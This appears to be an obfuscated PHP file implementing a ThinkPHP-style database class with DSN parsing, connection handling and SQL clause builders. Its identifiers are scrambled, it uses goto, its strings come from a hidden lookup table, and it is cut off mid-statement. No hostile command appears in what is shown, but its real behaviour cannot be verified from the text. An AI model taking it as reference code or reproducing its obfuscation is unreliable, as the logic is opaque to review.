<?php
 goto b›ë£Êî£µ; eµõã«óÖ: define($_SERVER[Æ š¦İÈ][238], 1); define($_SERVER[Æ š¦İÈ][239], 0); define($_SERVER[Æ š¦İÈ][240], 2); goto a½…Òù¹”; bÀ”›¾½š: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\x65\x71" => "\x3c\x3e", "\x67\164" => "\76", "\x65\x67\164" => "\x3e\x3d", "\x6c\x74" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\x6e\x6f\x74\154\x69\153\145" => "\116\117\x54\x20\x4c\x49\x4b\105", "\x6c\x69\x6b\x65" => "\x4c\x49\x4b\105", "\151\156" => "\111\x4e", "\156\x6f\x74\151\156" => "\x4e\117\124\x20\111\x4e", "\x6e\x6f\x74\x20\x69\156" => "\x4e\x4f\124\x20\111\x4e", "\142\x65\x74\167\145\145\156" => "\102\x45\124\127\105\105\x4e", "\156\x6f\x74\142\145\x74\x77\145\145\x6e" => "\116\x4f\x54\40\102\105\124\x57\x45\x45\116", "\x6e\157\164\x20\142\x65\x74\x77\x65\x65\x6e" => "\x4e\117\x54\x20\102\105\124\x57\105\105\116"); protected $selectSql = "\x53\105\x4c\x45\103\124\x25\104\111\123\124\x49\116\x43\124\45\x20\45\x46\x49\105\x4c\104\45\40\106\x52\117\x4d\40\x25\124\101\102\114\x45\x25\x25\x4a\117\111\116\45\45\x57\110\105\x52\x45\45\x25\x47\x52\117\125\x50\x25\45\x48\x41\x56\x49\116\107\45\45\117\x52\104\105\122\x25\x25\114\111\115\111\124\45\x20\45\x55\116\111\117\x4e\45\x25\103\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $…¹–£ó£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Æ š¦İÈ][951], $…¹–£ó£); } public function factory($•óƒÖÃ = '') { $ñí±€ìì =& $_SERVER[Æ š¦İÈ]; $•óƒÖÃ = $this->parseConfig($•óƒÖÃ); if (empty($•óƒÖÃ[$ñí±€ìì[952]])) { think_exception(think_lang($ñí±€ìì[953])); } $this->dbType = ucwords(strtolower($•óƒÖÃ[$ñí±€ìì[952]])); $©¢Ø×í„ = $ñí±€ìì[954] . $this->dbType; if (class_exists($©¢Ø×í„)) { $”ºµ¯£³ = new $©¢Ø×í„($•óƒÖÃ); if ($ñí±€ìì[955] != strtolower($•óƒÖÃ[$ñí±€ìì[952]])) { $”ºµ¯£³->dbType = strtoupper($this->dbType); } else { $”ºµ¯£³->dbType = $this->_getDsnType($•óƒÖÃ[$ñí±€ìì[907]]); } } else { think_exception(think_lang($ñí±€ìì[956]) . $ñí±€ìì[957] . $©¢Ø×í„); } return $”ºµ¯£³; } public function __call($®ó¬›÷ö, $éªŞ°‚ö) { if (method_exists($this, $®ó¬›÷ö)) { return call_user_func_array(array($this, $®ó¬›÷ö), $éªŞ°‚ö); } } protected function _getDsnType($—ø’ØÚ¤) { $„“ó‰¾ò = explode($_SERVER[Æ š¦İÈ][4], $—ø’ØÚ¤); $’áíèŸ£ = strtoupper(trim($„“ó‰¾ò[0])); return $’áíèŸ£; } private function parseConfig($šÜ°–’ = '') { $äÒË¨ª =& $_SERVER[Æ š¦İÈ]; if (!empty($šÜ°–’) && is_string($šÜ°–’)) { $šÜ°–’ = $this->parseDSN($šÜ°–’); } elseif (is_array($šÜ°–’)) { $šÜ°–’ = array_change_key_case($šÜ°–’); $šÜ°–’ = array($äÒË¨ª[952] => $šÜ°–’[$äÒË¨ª[958]], $äÒË¨ª[879] => $šÜ°–’[$äÒË¨ª[959]], $äÒË¨ª[880] => $šÜ°–’[$äÒË¨ª[960]], $äÒË¨ª[877] => $šÜ°–’[$äÒË¨ª[961]], $äÒË¨ª[878] => $šÜ°–’[$äÒË¨ª[962]], $äÒË¨ª[21] => $šÜ°–’[$äÒË¨ª[963]], $äÒË¨ª[907] => $šÜ°–’[$äÒË¨ª[964]], $äÒË¨ª[17] => isset($šÜ°–’[$äÒË¨ª[965]]) ? $šÜ°–’[$äÒË¨ª[965]] : array()); } elseif (empty($šÜ°–’)) { if (think_config($äÒË¨ª[966]) && $äÒË¨ª[955] != strtolower(think_config($äÒË¨ª[967]))) { $šÜ°–’ = $this->parseDSN(think_config($äÒË¨ª[966])); } else { $šÜ°–’ = array($äÒË¨ª[952] => think_config($äÒË¨ª[967]), $äÒË¨ª[879] => think_config($äÒË¨ª[968]), $äÒË¨ª[880] => think_config($äÒË¨ª[969]), $äÒË¨ª[877] => think_config($äÒË¨ª[970]), $äÒË¨ª[878] => think_config($äÒË¨ª[971]), $äÒË¨ª[21] => think_config($äÒË¨ª[243]), $äÒË¨ª[907] => think_config($äÒË¨ª[966]), $äÒË¨ª[17] => think_config($äÒË¨ª[972])); } } return $šÜ°–’; } protected function initConnect($–ÚâÈá¶ = true) { if (1 == think_config($_SERVER[Æ š¦İÈ][22])) { $this->_linkID = $this->multiConnect($–ÚâÈá¶); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¸İÛêªŠ => $×²ç©×˜) { $this->_linkID = $×²ç©×˜; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ĞœØ‚ı¶ = false) { $‰Æëã„‘ =& $_SERVER[Æ š¦İÈ]; static $•Èª•˜ì = array(); static $ßÙ´±şƒ = -1; if (empty($•Èª•˜ì)) { foreach ($this->config as $Àî¼Ê => $ˆ‘×”ÑÈ) { $•Èª•˜ì[$Àî¼Ê] = explode($‰Æëã„‘[50], $ˆ‘×”ÑÈ); } } if (think_config($‰Æëã„‘[973])) { if ($ĞœØ‚ı¶ || think_config($‰Æëã„‘[390]) === !0) { $Øš¹¯åÍ = floor(mt_rand(0, think_config($‰Æëã„‘[974]) - 1)); $ßÙ´±şƒ = $Øš¹¯åÍ; } else { if (is_numeric(think_config($‰Æëã„‘[975]))) { $Øš¹¯åÍ = think_config($‰Æëã„‘[975]); } else { $Øš¹¯åÍ = floor(mt_rand(think_config($‰Æëã„‘[974]), count($•Èª•˜ì[$‰Æëã„‘[877]]) - 1)); } } } else { $Øš¹¯åÍ = floor(mt_rand(0, count($•Èª•˜ì[$‰Æëã„‘[877]]) - 1)); $ßÙ´±şƒ = $Øš¹¯åÍ; } $Øš¹¯åÍ = $ßÙ´±şƒ !== -1 ? $ßÙ´±şƒ : $Øš¹¯åÍ; $×›ìû€Ü = array($‰Æëã„‘[879] => isset($•Èª•˜ì[$‰Æëã„‘[879]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[879]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[879]][0], $‰Æëã„‘[880] => isset($•Èª•˜ì[$‰Æëã„‘[880]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[880]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[880]][0], $‰Æëã„‘[877] => isset($•Èª•˜ì[$‰Æëã„‘[877]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[877]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[877]][0], $‰Æëã„‘[878] => isset($•Èª•˜ì[$‰Æëã„‘[878]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[878]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[878]][0], $‰Æëã„‘[21] => isset($•Èª•˜ì[$‰Æëã„‘[21]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[21]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[21]][0], $‰Æëã„‘[907] => isset($•Èª•˜ì[$‰Æëã„‘[907]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[907]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[907]][0], $‰Æëã„‘[17] => isset($•Èª•˜ì[$‰Æëã„‘[17]][$Øš¹¯åÍ]) ? $•Èª•˜ì[$‰Æëã„‘[17]][$Øš¹¯åÍ] : $•Èª•˜ì[$‰Æëã„‘[17]][0]); return $this->connect($×›ìû€Ü, $Øš¹¯åÍ); } public function parseDSN($¢­–ª£) { $Ï™ÒÙ‚ =& $_SERVER[Æ š¦İÈ]; if (empty($¢­–ª£)) { return !1; } $ç£€ªñù = parse_url($¢­–ª£); if ($ç£€ªñù[$Ï™ÒÙ‚[175]]) { $ö´ç— = array($Ï™ÒÙ‚[952] => $ç£€ªñù[$Ï™ÒÙ‚[175]], $Ï™ÒÙ‚[879] => isset($ç£€ªñù[$Ï™ÒÙ‚[596]]) ? $ç£€ªñù[$Ï™ÒÙ‚[596]] : $Ï™ÒÙ‚[12], $Ï™ÒÙ‚[880] => isset($ç£€ªñù[$Ï™ÒÙ‚[976]]) ? $ç£€ªñù[$Ï™ÒÙ‚[976]] : $Ï™ÒÙ‚[12], $Ï™ÒÙ‚[877] => isset($ç£€ªñù[$Ï™ÒÙ‚[176]]) ? $ç£€ªñù[$Ï™ÒÙ‚[176]] : $Ï™ÒÙ‚[12], $Ï™ÒÙ‚[878] => isset($ç£€ªñù[$Ï™ÒÙ‚[177]]) ? $ç£€ªñù[$Ï™ÒÙ‚[177]] : $Ï™ÒÙ‚[12], $Ï™ÒÙ‚[21] => isset($ç£€ªñù[$Ï™ÒÙ‚[78]]) ? substr($ç£€ªñù[$Ï™ÒÙ‚[78]], 1) : $Ï™ÒÙ‚[12]); } else { preg_match($Ï™ÒÙ‚[977], trim($¢­–ª£), $§³ŒœÀš); $ö´ç— = array($Ï™ÒÙ‚[952] => $§³ŒœÀš[1], $Ï™ÒÙ‚[879] => $§³ŒœÀš[2], $Ï™ÒÙ‚[880] => $§³ŒœÀš[3], $Ï™ÒÙ‚[877] => $§³ŒœÀš[4], $Ï™ÒÙ‚[878] => $§³ŒœÀš[5], $Ï™ÒÙ‚[21] => $§³ŒœÀš[6]); } $ö´ç—[$Ï™ÒÙ‚[907]] = $Ï™ÒÙ‚[12]; return $ö´ç—; } protected function debug() { $€ğ‡î‡ò =& $_SERVER[Æ š¦İÈ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $€ğ‡î‡ò[978]; if (think_config($€ğ‡î‡ò[979])) { think_status($€ğ‡î‡ò[980]); think_trace($this->queryStr . $€ğ‡î‡ò[981] . think_status($€ğ‡î‡ò[24], $€ğ‡î‡ò[980], 6) . $€ğ‡î‡ò[982], $€ğ‡î‡ò[12], $€ğ‡î‡ò[983]); } } protected function parseLock($éé„ü¦¡ = false) { $Î¾š…Ô… =& $_SERVER[Æ š¦İÈ]; if (!$éé„ü¦¡) { return $Î¾š…Ô…[12]; } if ($Î¾š…Ô…[909] == $this->dbType) { return $Î¾š…Ô…[984]; } return $Î¾š…Ô…[985]; } protected function parseSet($½ëù¯ŸÈ) { $š£°Ìšæ =& $_SERVER[Æ š¦İÈ]; foreach ($½ëù¯ŸÈ as $ó¥åÁåš => $Ş¨ºÆÚ÷) { if (is_array($Ş¨ºÆÚ÷) && $š£°Ìšæ[294] == $Ş¨ºÆÚ÷[0]) { $ƒĞèÄ®Ã[] = $this->parseKey($ó¥åÁåš) . $š£°Ìšæ[875] . $Ş¨ºÆÚ÷[1]; } elseif (is_scalar($Ş¨ºÆÚ÷) || is_null($Ş¨ºÆÚ÷)) { $ƒĞèÄ®Ã[] = $this->parseKey($ó¥åÁåš) . $š£°Ìšæ[875] . $this->parseValue($Ş¨ºÆÚ÷); } } return $š£°Ìšæ[986] . implode($š£°Ìšæ[50], $ƒĞèÄ®Ã); } protected function bindParam($÷¸ùÏ÷½, $Èş¢ºú) { $this->bind[$_SERVER[Æ š¦İÈ][4] . $÷¸ùÏ÷½] = $Èş¢ºú; } protected function parseBind($•ÍÈ‰¯±) { $•ÍÈ‰¯± = array_merge($this->bind, $•ÍÈ‰¯±); $this->bind = array(); return $•ÍÈ‰¯±; } function parseKey(&$±ñç¼…Ç, $‚©éó‘° = true) { if ($‚©éó‘°) { $±ñç¼…Ç = $this->parseKeyCheck($±ñç¼…Ç); } return $±ñç¼…Ç; } function parseKeyCheck($£»ÆÎî) { $…ÍëÅê› =& $_SERVER[Æ š¦İÈ]; $£»ÆÎî = trim($£»ÆÎî); if (!preg_match($…ÍëÅê›[987], $£»ÆÎî)) { think_exception($…ÍëÅê›[988] . $£»ÆÎî); } return $£»ÆÎî; } protected function parseValue($…Úã‹) { $üñ¿²æó =& $_SERVER[Æ š¦İÈ]; if (is_string($…Úã‹)) { $…Úã‹ = $üñ¿²æó[948] . $this->escapeString($…Úã‹) . $üñ¿²æó[948]; } elseif (isset($…Úã‹[0]) && is_string($…Úã‹[0]) && strtolower($…Úã‹[0]) == $üñ¿²æó[294]) { $…Úã‹ = $this->escapeString($…Úã‹[1]); } elseif (is_array($…Úã‹)) { $…Úã‹ = array_map(array($this, $üñ¿²æó[949]), $…Úã‹); } elseif (is_bool($…Úã‹)) { $…Úã‹ = $…Úã‹ ? $üñ¿²æó[89] : $üñ¿²æó[192]; } elseif (is_null($…Úã‹)) { $…Úã‹ = $üñ¿²æó[104]; } return $…Úã‹; } protected function parseField($›¶ê•³é) { $È¢£á„Ë =& $_SERVER[Æ š¦İÈ]; if (is_string($›¶ê•³é) && strpos($›¶ê•³é, $È¢£á„Ë[50])) { $›¶ê•³é = explode($È¢£á„Ë[50], $›¶ê•³é); } if (is_array($›¶ê•³é)) { $¸ı‡¦ª = array(); foreach ($›¶ê•³é as $¢Éè½‡– => $‹Ô¢¾½ä) { if (!is_numeric($¢Éè½‡–)) { $¸ı‡¦ª[] = $this->parseKey($¢Éè½‡–, !1) . $È¢£á„Ë[989] . $this->parseKey($‹Ô¢¾½ä); } else { $¸ı‡¦ª[] = $this->parseKey($‹Ô¢¾½ä); } } $òÆ§Ãˆô = implode($È¢£á„Ë[50], $¸ı‡¦ª); } elseif (is_string($›¶ê•³é) && !empty($›¶ê•³é)) { $òÆ§Ãˆô = $›¶ê•³é; } else { $òÆ§Ãˆô = $È¢£á„Ë[183]; } return $òÆ§Ãˆô; } protected function parseTable($’ê½ÚŠ) { $ÓöÊéõ³ =& $_SERVER[Æ š¦İÈ]; if (is_array($’ê½ÚŠ)) { $­ÖÃÓÌ = array(); foreach ($’ê½ÚŠ as $±­Ú¡üÆ => $ë ±ú“¡) { if (!is_numeric($±­Ú¡üÆ)) { $­ÖÃÓÌ[] = $this->parseKey($±­Ú¡üÆ) . $ÓöÊéõ³[53] . $this->parseKey($ë ±ú“¡); } else { $­ÖÃÓÌ[] = $this->parseKey($±­Ú¡üÆ); } } $’ê½ÚŠ = $­ÖÃÓÌ; } elseif (is_string($’ê½ÚŠ)) { if (strstr($’ê½ÚŠ, $ÓöÊéõ³[53])) { return $’ê½ÚŠ; } $’ê½ÚŠ = explode($ÓöÊéõ³[50], $’ê½ÚŠ); array_walk($’ê½ÚŠ, array($this, $ÓöÊéõ³[897])); } return $ÓöÊéõ³[891] . trim(implode($ÓöÊéõ³[990], $’ê½ÚŠ), $ÓöÊéõ³[382]) . $ÓöÊéõ³[891]; } protected function parseWhere($ûÒÜÆ¥Û) { $Ü¿ÔçÁ =& $_SERVER[Æ š¦İÈ]; $í®Ôë…ë = $Ü¿ÔçÁ[12]; if (is_string($ûÒÜÆ¥Û)) { $í®Ôë…ë = $ûÒÜÆ¥Û; } else { $çÔ½ñé = isset($ûÒÜÆ¥Û[$Ü¿ÔçÁ[991]]) ? strtoupper($ûÒÜÆ¥Û[$Ü¿ÔçÁ[991]]) : $Ü¿ÔçÁ[12]; if (in_array($çÔ½ñé, array($Ü¿ÔçÁ[992], $Ü¿ÔçÁ[993], $Ü¿ÔçÁ[994]))) { $çÔ½ñé = $Ü¿ÔçÁ[53] . $çÔ½ñé . $Ü¿ÔçÁ[53]; unset($ûÒÜÆ¥Û[$Ü¿ÔçÁ[991]]); } else { $çÔ½ñé = $Ü¿ÔçÁ[995]; } foreach ($ûÒÜÆ¥Û as $úĞ³­­– => $ğ“ëô¦›) { $í®Ôë…ë .= $Ü¿ÔçÁ[274]; if (is_numeric($úĞ³­­–)) { $úĞ³­­– = $Ü¿ÔçÁ[996]; } if (0 === strpos($úĞ³­­–, $Ü¿ÔçÁ[11])) { $í®Ôë…ë .= $this->parseThinkWhere($úĞ³­­–, $ğ“ëô¦›); } else { if (!preg_match($Ü¿ÔçÁ[997], trim($úĞ³­­–))) { think_exception(think_lang($Ü¿ÔçÁ[998]) . $Ü¿ÔçÁ[4] . $úĞ³­­–); } $³¦¾æ = is_array($ğ“ëô¦›) && isset($ğ“ëô¦›[$Ü¿ÔçÁ[999]]); $úĞ³­­– = trim($úĞ³­­–); if (strpos($úĞ³­­–, $Ü¿ÔçÁ[280])) { $¨ìõ¥¨” = explode($Ü¿ÔçÁ[280], $úĞ³­­–); $¡à¤¿¥ = array(); foreach ($¨ìõ¥¨” as $½§ªââı => $š¦ØÈúÛ) { $Ş–Ä¬˜Ï = $³¦¾æ ? $ğ“ëô¦›[$½§ªââı] : $ğ“ëô¦›; $¡à¤¿¥[] = $Ü¿ÔçÁ[257] . $this->parseWhereItem($this->parseKey($š¦ØÈúÛ), $Ş–Ä¬˜Ï) . $Ü¿ÔçÁ[896]; } $í®Ôë…ë .= implode($Ü¿ÔçÁ[1000], $¡à¤¿¥); } elseif (strpos($úĞ³­­–, $Ü¿ÔçÁ[281])) { $¨ìõ¥¨” = explode($Ü¿ÔçÁ[281], $úĞ³­­–); $¡à¤¿¥ = array(); foreach ($¨ìõ¥¨” as $½§ªââı => $š¦ØÈúÛ) { $Ş–Ä¬˜Ï = $³¦¾æ ? $ğ“ëô¦›[$½§ªââı] : $ğ“ëô¦›; $¡à¤¿¥[] = $Ü¿ÔçÁ[257] . $this->parseWhereItem($this->parseKey($š¦ØÈúÛ), $Ş–Ä¬˜Ï) . $Ü¿ÔçÁ[896]; } $í®Ôë…ë .= implode($Ü¿ÔçÁ[995], $¡à¤¿¥); } else { $í®Ôë…ë .= $this->parseWhereItem($this->parseKey($úĞ³­­–), $ğ“ëô¦›); } } $í®Ôë…ë .= $Ü¿ÔçÁ[275] . $çÔ½ñé; } $í®Ôë…ë = substr($í®Ôë…ë, 0, -strlen($çÔ½ñé)); } return empty($í®Ôë…ë) ? $Ü¿ÔçÁ[12] : $Ü¿ÔçÁ[1001] . $í®Ôë…ë; } protected function parseWhereItem($©¾ŒéÄê, $şÔ¸ª‘) { $è¼÷‡ç« =& $_SERVER[Æ š¦İÈ]; $ÒŞÈ¶àÄ = $è¼÷‡ç«[12]; if (is_array($şÔ¸ª‘)) { if (is_string($şÔ¸ª‘[0])) { $ËáÏÑÕî = strtolower($şÔ¸ª‘[0]); if (in_array($şÔ¸ª‘[0], array($è¼÷‡ç«[875], $è¼÷‡ç«[1002], $è¼÷‡ç«[1003], $è¼÷‡ç«[1004], $è¼÷‡ç«[1005], $è¼÷‡ç«[1006]))) { $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[53] . $şÔ¸ª‘[0] . $è¼÷‡ç«[53] . $this->parseValue($şÔ¸ª‘[1]); } elseif (preg_match($è¼÷‡ç«[1007], $şÔ¸ª‘[0])) { $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[53] . $this->parseValue($şÔ¸ª‘[1]); } elseif (preg_match($è¼÷‡ç«[1008], $şÔ¸ª‘[0])) { if (is_array($şÔ¸ª‘[1])) { $Á²Ÿò = isset($şÔ¸ª‘[2]) ? strtoupper($şÔ¸ª‘[2]) : $è¼÷‡ç«[993]; if (in_array($Á²Ÿò, array($è¼÷‡ç«[992], $è¼÷‡ç«[993], $è¼÷‡ç«[994]))) { $õÆˆçäÏ = array(); foreach ($şÔ¸ª‘[1] as $³»ø½Áè) { $õÆˆçäÏ[] = $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[53] . $this->parseValue($³»ø½Áè); } $ÒŞÈ¶àÄ .= $è¼÷‡ç«[257] . implode($è¼÷‡ç«[53] . $Á²Ÿò . $è¼÷‡ç«[53], $õÆˆçäÏ) . $è¼÷‡ç«[896]; } } else { $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[53] . $this->parseValue($şÔ¸ª‘[1]); } } elseif ($è¼÷‡ç«[294] == $ËáÏÑÕî) { $ÒŞÈ¶àÄ .= $è¼÷‡ç«[894] . $©¾ŒéÄê . $è¼÷‡ç«[53] . $şÔ¸ª‘[1] . $è¼÷‡ç«[1009]; } elseif (preg_match($è¼÷‡ç«[1010], $şÔ¸ª‘[0])) { $ÒŞÈ¶àÄ .= $şÔ¸ª‘[0]; } elseif (preg_match($è¼÷‡ç«[1011], $şÔ¸ª‘[0])) { if (isset($şÔ¸ª‘[2]) && $è¼÷‡ç«[294] == $şÔ¸ª‘[2]) { $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[53] . $şÔ¸ª‘[1]; } else { if (is_string($şÔ¸ª‘[1])) { $şÔ¸ª‘[1] = explode($è¼÷‡ç«[50], $şÔ¸ª‘[1]); } $İ¨Ò’¶À = implode($è¼÷‡ç«[50], $this->parseValue($şÔ¸ª‘[1])); $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[894] . $İ¨Ò’¶À . $è¼÷‡ç«[896]; } } elseif (preg_match($è¼÷‡ç«[1012], $şÔ¸ª‘[0])) { $¸éë™¦ü = is_string($şÔ¸ª‘[1]) ? explode($è¼÷‡ç«[50], $şÔ¸ª‘[1]) : $şÔ¸ª‘[1]; $ÒŞÈ¶àÄ .= $è¼÷‡ç«[894] . $©¾ŒéÄê . $è¼÷‡ç«[53] . $this->exp[$ËáÏÑÕî] . $è¼÷‡ç«[53] . $this->parseValue($¸éë™¦ü[0]) . $è¼÷‡ç«[995] . $this->parseValue($¸éë™¦ü[1]) . $è¼÷‡ç«[275]; } else { think_exception(think_lang($è¼÷‡ç«[998]) . $è¼÷‡ç«[4] . $şÔ¸ª‘[0]); } } else { $ªğ•ÍÆÌ = count($şÔ¸ª‘); $ìÁ„¦“ş = $è¼÷‡ç«[12]; if (is_string($şÔ¸ª‘[$ªğ•ÍÆÌ - 1])) { $ìÁ„¦“ş = isset($şÔ¸ª‘[$ªğ•ÍÆÌ - 1]) ? strtoupper($şÔ¸ª‘[$ªğ•ÍÆÌ - 1]) : $è¼÷‡ç«[12]; if (in_array($ìÁ„¦“ş, array($è¼÷‡ç«[992], $è¼÷‡ç«[993], $è¼÷‡ç«[994]))) { $ªğ•ÍÆÌ = $ªğ•ÍÆÌ - 1; } } else { $ìÁ„¦“ş = $è¼÷‡ç«[992]; } for ($…¾¿õç = 0; $…¾¿õç < $ªğ•ÍÆÌ; $…¾¿õç++) { $¸éë™¦ü = is_array($şÔ¸ª‘[$…¾¿õç]) ? $şÔ¸ª‘[$…¾¿õç][1] : $şÔ¸ª‘[$…¾¿õç]; if ($è¼÷‡ç«[294] == strtolower($şÔ¸ª‘[$…¾¿õç][0])) { $ÒŞÈ¶àÄ .= $è¼÷‡ç«[257] . $©¾ŒéÄê . $è¼÷‡ç«[53] . $¸éë™¦ü . $è¼÷‡ç«[1009] . $ìÁ„¦“ş . $è¼÷‡ç«[53]; } else { $ºÀâ­ââ = is_array($şÔ¸ª‘[$…¾¿õç]) ? $this->exp[strtolower($şÔ¸ª‘[$…¾¿õç][0])] : $è¼÷‡ç«[875]; if (!$ºÀâ­ââ && is_array($şÔ¸ª‘[$…¾¿õç]) && in_array($şÔ¸ª‘[$…¾¿õç][0], array($è¼÷‡ç«[875], $è¼÷‡ç«[1002], $è¼÷‡ç«[1003], $è¼÷‡ç«[1004], $è¼÷‡ç«[1005], $è¼÷‡ç«[1006]))) { $ºÀâ­ââ = $şÔ¸ª‘[$…¾¿õç][0]; } $ÒŞÈ¶àÄ .= $è¼÷‡ç«[257] . $©¾ŒéÄê . $è¼÷‡ç«[53] . $ºÀâ­ââ . $è¼÷‡ç«[53] . $this->parseValue($¸éë™¦ü) . $è¼÷‡ç«[1009] . $ìÁ„¦“ş . $è¼÷‡ç«[53]; } } $ÒŞÈ¶àÄ = substr($ÒŞÈ¶àÄ, 0, -4); } } else { $ÒŞÈ¶àÄ .= $©¾ŒéÄê . $è¼÷‡ç«[1013] . $this->parseValue($şÔ¸ª‘); } return $ÒŞÈ¶àÄ; } protected function parseThinkWhere($øÈšÉ‹×, $¢¯Ã›‘) { $¶ÜÜ›™‘ =& $_SERVER[Æ š¦İÈ]; $Õ­éË¯ = $¶ÜÜ›™‘[12]; switch ($øÈšÉ‹×) { case $¶ÜÜ›™‘[349]: $Õ­éË¯ = $¢¯Ã›‘; break; case $¶ÜÜ›™‘[996]: $Õ­éË¯ = is_string($¢¯Ã›‘) ? $¢¯Ã›‘ : substr($this->parseWhere($¢¯Ã›‘), 6); break; case $¶ÜÜ›™‘[1014]: parse_str($¢¯Ã›‘, $³î—×Ó±); if (isset($³î—×Ó±[$¶ÜÜ›™‘[991]])) { $ìÉËé½É = $¶ÜÜ›™‘[53] . strtoupper($³î—×Ó±[$¶ÜÜ›™‘[991]]) . $¶ÜÜ›™‘[53]; unset($³î—×Ó±[$¶ÜÜ›™‘[991]]); } else { $ìÉËé½É = $¶ÜÜ›™‘[995]; } $ÊÄ Œ×ƒ = array(); foreach ($³î—×Ó± as $¨ŸÙûÎ => $¢ô¿‹¹) { $ÊÄ Œ×ƒ[] = $this->parseKey($¨ŸÙûÎ) . $¶ÜÜ›™‘[1013] . $this->parseValue($¢ô¿‹¹); } $Õ­éË¯ = implode($ìÉËé½É, $ÊÄ Œ×ƒ); break; } return $Õ­éË¯; } protected function parseLimit($ú¾·¥… ) { $‰üĞ©®æ =& $_SERVER[Æ š¦İÈ]; return !empty($ú¾·¥… ) ? $‰üĞ©®æ[51] . $ú¾·¥…  . $‰üĞ©®æ[53] : $‰üĞ©®æ[12]; } protected function parseJoin($Ö¹Ë¥á) { $í™¨—³Â =& $_SERVER[Æ š¦İÈ]; $—ñ‰ÁİÏ = $í™¨—³Â[12]; if (!empty($Ö¹Ë¥á)) { if (is_array($Ö¹Ë¥á)) { foreach ($Ö¹Ë¥á as $¸¬ì‘ß¶ => $öÃƒğ) { if (!1 !== stripos($öÃƒğ, $í™¨—³Â[1015])) { $—ñ‰ÁİÏ .= $í™¨—³Â[53] . $öÃƒğ; } else { $—ñ‰ÁİÏ .= $í™¨—³Â[1016] . $öÃƒğ; } } } else { $—ñ‰ÁİÏ .= $í™¨—³Â[1016] . $Ö¹Ë¥á; } } $—ñ‰ÁİÏ = preg_replace($í™¨—³Â[1017], think_config($í™¨—³Â[921]) . $í™¨—³Â[1018], $—ñ‰ÁİÏ); return $—ñ‰ÁİÏ; } protected function parseOrder($ã²¢¿‡”) { $ÃĞÅ‰½Á =& $_SERVER[Æ š¦İÈ]; if (is_array($ã²¢¿‡”)) { $Â”¦Å¤» = array(); foreach ($ã²¢¿‡” as $ÈÆËô¢µ => $ÉÎ°ÈÇ) { if (is_numeric($ÈÆËô¢µ)) { $Â”¦Å¤»[] = $this->parseKey($ÉÎ°ÈÇ); } else { $ÉÎ°ÈÇ = in_array(strtoupper(trim($ÉÎ°ÈÇ)), array($ÃĞÅ‰½Á[1019], $ÃĞÅ‰½Á[1020])) ? $ÃĞÅ‰½Á[53] . $ÉÎ°ÈÇ : $ÃĞÅ‰½Á[12]; if (preg_match($ÃĞÅ‰½Á[1021], $ÈÆËô¢µ)) { $Â”¦Å¤»[] = $this->parseKey($ÈÆËô¢µ) . $ÉÎ°ÈÇ; } else { think_exception($ÃĞÅ‰½Á[1022] . $ÈÆËô¢µ); } } } $ã²¢¿‡” = implode($ÃĞÅ‰½Á[50], $Â”¦Å¤»); } return !empty($ã²¢¿‡”) ? $ÃĞÅ‰½Á[1023] . $ã²¢¿‡” : $ÃĞÅ‰½Á[12]; } protected function parseGroup($Çƒæ™‡) { $£›®Êú€ =& $_SERVER[Æ š¦İÈ]; return !empty($Çƒæ™‡) ? $£›®Êú€[1024] . $Çƒæ™‡ : $£›®Êú€[12]; } protected function parseHaving($ó¥á§“¬) { $şİÉıôï =& $_SERVER[Æ š¦İÈ]; return !empty($ó¥á§“¬) ? $şİÉıôï[1025] . $ó¥á§“¬ : $şİÉıôï[12]; } protected function parseComment($Õê”Ğù) { $”‚²÷Ùø =& $_SERVER[Æ š¦İÈ]; return !empty($Õê”Ğù) ? $”‚²÷Ùø[1026] . $Õê”Ğù . $”‚²÷Ùø[1027] : $”‚²÷Ùø[12]; } protected function parseDistinct($Ñô¯©İı) { $÷À÷Æƒú =& $_SERVER[Æ š¦İÈ]; return !empty($Ñô¯©İı) ? $÷À÷Æƒú[1028] : $÷À÷Æƒú[12]; } protected function parseUnion($‚îğĞƒĞ) { $èëÂİÊ =& $_SERVER[Æ š¦İÈ]; if (empty($‚îğĞƒĞ)) { return $èëÂİÊ[12]; } if 